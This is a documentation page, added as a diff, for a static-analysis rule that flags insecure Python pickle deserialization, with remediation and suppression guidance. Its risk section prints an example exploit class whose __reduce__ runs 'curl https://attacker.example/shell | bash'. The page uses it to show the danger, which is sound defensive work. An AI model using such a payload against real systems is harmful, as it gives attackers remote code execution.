@@ -1,0 +1,146 @@
+---
+title: "VNX-PY-003: Insecure deserialization with pickle"
+nav: "VNX-PY-003"
+description: "Detect pickle-format deserialization (pickle, cPickle, _pickle, dill, cloudpickle load/loads/Unpickler, including aliases and imported names, and unsafe jsonpickle.decode), which executes code embedded in the data."
+order: 857
+sources: ["cli/internal/sast/rules/vnx-py-003.rego", "cli/website/content/docs/sast-rules/vnx-py-003.md"]
+checked: ["cli@4c8c3b7"]
+updated: "01 Nov 2026"
+generated: true
+---
+
+| Field | Value |
+|---|---|
+| Rule ID | `VNX-PY-003` |
+| Severity | High |
+| SARIF level | `error` |
+| Kind | `sast` |
+| Languages | Python |
+| CWE | [CWE-502](https://cwe.mitre.org/data/definitions/502.html) |
+| CAPEC | [CAPEC-586](https://capec.mitre.org/data/definitions/586.html) |
+| ATT&CK | [T1059.006](https://attack.mitre.org/techniques/T1059/006/) |
+| CWSS vector | `CWSS:1.0/TI:H/AP:A/AL:A/IC:N/FC:LT/RP:N/RL:A/AV:I/AS:N/IN:A/SC:A/BI:H/DI:H/EX:H/EC:N/P:H` |
+| Tags | `deserialization` `dangerous-function` |
+| Source | [`internal/sast/rules/vnx-py-003.rego`](https://github.com/Vulnetix/cli/blob/main/internal/sast/rules/vnx-py-003.rego) |
+
+## Overview
+
+This rule flags calls to `pickle.load()`, `pickle.loads()`, `cPickle.load()`, and `cPickle.loads()`. The Python pickle format is a bytecode stream for a stack-based virtual machine. When Python deserializes a pickle stream it executes the bytecode, which means a malicious pickle payload can run arbitrary Python code, including importing modules, calling functions, and executing system commands, before your application logic ever sees the data. There is no option to safely load an untrusted pickle. This maps to [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html).
+
+## Why This Matters
+
+Pickle-based remote code execution is trivial to exploit. An attacker only needs to craft a Python object that implements `__reduce__` returning a callable and arguments. When Python deserializes this object it calls the callable automatically:
+
+```python
+# What a malicious pickle payload looks like when crafted
+import pickle, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("curl https://attacker.example/shell | bash",))
+
+payload = pickle.dumps(Exploit())
+# Anyone calling pickle.loads(payload) executes the shell command
+```
+
+This payload is only a few bytes and trivially embeds in any data channel that uses pickle: file uploads, API responses, Redis cache entries, message queue messages, or ML model files. Unlike SQL injection or XSS, there is no input validation or escaping that makes pickle safe, the code executes before you can inspect the data.
+
+## What Gets Flagged
+
+A call to `load()`, `loads()` or `Unpickler()` of `pickle`, `cPickle`, `_pickle`, `dill` or `cloudpickle`, through the module, an `import pickle as pkl` alias (a dotted path such as `import six.moves.cPickle as pk` included), or a name imported with `from pickle import loads as unpickle`; and `jsonpickle.decode()` without `safe=True`.
+
+This rule is the one finding for a pickle call wherever its bytes come from. A call fed from a request, a socket or a download is not reported a second time by [VNX-345](/sast/rules/vnx-345/) or [VNX-PY-013](/sast/rules/vnx-py-013/).
+
+Not flagged: `pickle.dump()`/`dumps()`, a deep-copy round trip (`pickle.loads(pickle.dumps(obj))`), `json`/`msgpack`, other objects' `loads` methods (`serializer.loads(...)`), and mentions in comments or strings. ML model loaders such as `torch.load` are VNX-PY-013.
+
+```python
+# FLAGGED: an aliased module and an imported name
+import pickle as pkl
+from pickle import loads as unpickle
+a = pkl.loads(blob)
+task = unpickle(message.body)
+
+# FLAGGED: loading from a file
+with open("data.pkl", "rb") as f:
+    obj = pickle.load(f)
+
+# FLAGGED: loading from a network response
+obj = pickle.loads(response.content)
+
+# FLAGGED: loading from Redis cache
+obj = pickle.loads(redis_client.get("session:" + session_id))
+
+# FLAGGED: cPickle is equally unsafe
+import cPickle
+obj = cPickle.loads(data)
+```
+
+## Remediation
+
+1. **Replace pickle with a safe serialization format.** For most use cases, JSON or MessagePack provides everything pickle does without code execution:
+
+```python
+import json
+
+# SAFE: serialize to JSON
+serialized = json.dumps({"key": "value", "count": 42})
+
+# SAFE: deserialize from JSON, no code execution possible
+data = json.loads(serialized)
+```
+
+```python
+import msgpack  # pip install msgpack
+
+# SAFE: compact binary format, no code execution
+serialized = msgpack.packb({"key": "value"})
+data = msgpack.unpackb(serialized, raw=False)
+```
+
+2. **If you must use pickle on data you do not control, implement a SafeUnpickler.** This restricts which classes can be instantiated during deserialization. Only classes you explicitly allow can appear in the pickle stream:
+
+```python
+import pickle
+import io
+
+SAFE_CLASSES = {
+    ("builtins", "list"),
+    ("builtins", "dict"),
+    ("myapp.models", "UserProfile"),
+}
+
+class SafeUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if (module, name) not in SAFE_CLASSES:
+            raise pickle.UnpicklingError(
+                f"Forbidden class: {module}.{name}"
+            )
+        return super().find_class(module, name)
+
+# SAFER (but still prefer JSON): load with class allowlist
+obj = SafeUnpickler(io.BytesIO(data)).load()
+```
+
+3. **For ML model files, use a format designed for safety.** See VNX-PY-013 for detailed guidance on `torch.load(..., weights_only=True)` and SafeTensors.
+
+4. **Audit existing pickle usage.** Search for all `import pickle` and `import cPickle` statements in your codebase to find serialization code that feeds data back into pickle, both the write and read side need to be assessed.
+
+## References
+
+- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
+- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
+- [Python docs – pickle security warning](https://docs.python.org/3/library/pickle.html#restricting-globals)
+- [Python docs – json module](https://docs.python.org/3/library/json.html)
+- [CAPEC-586: Object Injection](https://capec.mitre.org/data/definitions/586.html)
+- [MITRE ATT&CK T1059.006 – Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/)
+
+## Suppressing this rule
+
+Put a `nosec` comment on the line, or on line 1 to cover the whole file. Use the comment marker of the file's language (`#`, `//`, `--` or `;`):
+
+```text
+# nosec vnx-py-003
+// nosec vnx-py-003
+```
+
+Or record an ignore rule: `vulnetix ignore add --rule vnx-py-003 --reason "..."`. See [Suppressing findings](/sast/guides/suppressing-findings/).
